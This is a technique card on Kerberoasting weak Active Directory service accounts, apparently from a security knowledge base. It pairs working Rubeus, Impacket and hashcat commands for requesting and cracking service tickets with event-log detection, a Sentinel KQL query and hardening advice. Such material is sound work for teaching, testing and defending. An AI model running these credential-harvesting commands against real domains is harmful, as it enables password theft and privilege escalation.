# [CA-KERB-001]: Kerberoasting Weak Service Accounts

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-001 |
| **MITRE ATT&CK v18.1** | [Steal or Forge Kerberos Tickets: Kerberoasting (T1558.003)](https://attack.mitre.org/techniques/T1558/003/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows AD |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Abuse of the Kerberos TGS-REQ protocol. Any valid domain user can request a service ticket (TGS) for any Service Principal Name (SPN) in the directory. Portions of the TGS are encrypted with the target service account's NTLM hash. Attackers request these tickets and crack them offline to reveal the service account's plaintext password.
- **Attack Surface:** Any user account with a registered SPN (`servicePrincipalName` attribute).
- **Business Impact:** **Privilege Escalation**. Service accounts often run with elevated privileges (Domain Admin or Local Admin on servers).

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Any Valid Domain User.
- **Vulnerable Config:** Service accounts with weak passwords.
- **Tools:**
    - [Rubeus](https://github.com/GhostPack/Rubeus)
    - [Impacket (GetUserSPNs.py)](https://github.com/fortra/impacket)
    - [Hashcat](https://hashcat.net/hashcat/)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Exploitation (Windows)**
Request TGS tickets for all roastable accounts and output in hashcat format.
```powershell
.\Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt
```

**Step 2: Exploitation (Linux/Remote)**
Use Impacket to request TGS from a non-domain machine.
```bash
GetUserSPNs.py target.local/user:password -request -outputfile hashes.txt
```

**Step 3: Cracking**
Crack the TGS hashes (Type 13100).
```bash
hashcat -m 13100 -a 0 hashes.txt rockyou.txt
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Event Logs
| Source | Event ID | Filter Logic |
|---|---|---|
| **Security** | 4769 | Ticket Options: `0x40810000` (RC4 Encryption `0x17`), Service Name not `krbtgt`. High volume from one user. |

#### 5.2 Sentinel (KQL)
```kusto
SecurityEvent
| where EventID == 4769
| where TicketEncryptionType == "0x17" // RC4
| where ServiceName !has "$" // Focus on user accounts, not machine accounts
| summarize Count=count() by TargetUserName, IPAddress
| where Count > 5
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Encryption:** Enforce AES-128/256 for Kerberos to prevent RC4 usage (harder to crack, though not impossible).
*   **Passwords:** Use 25+ character complex passwords for all Service Accounts.
*   **Architecture:** Use **gMSAs** (Group Managed Service Accounts) wherever possible, as their passwords are random 120-char strings that cannot be practically cracked.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-VALID-001]
> **Next Logical Step:** [LAT-AD-001] (Use cracked creds)
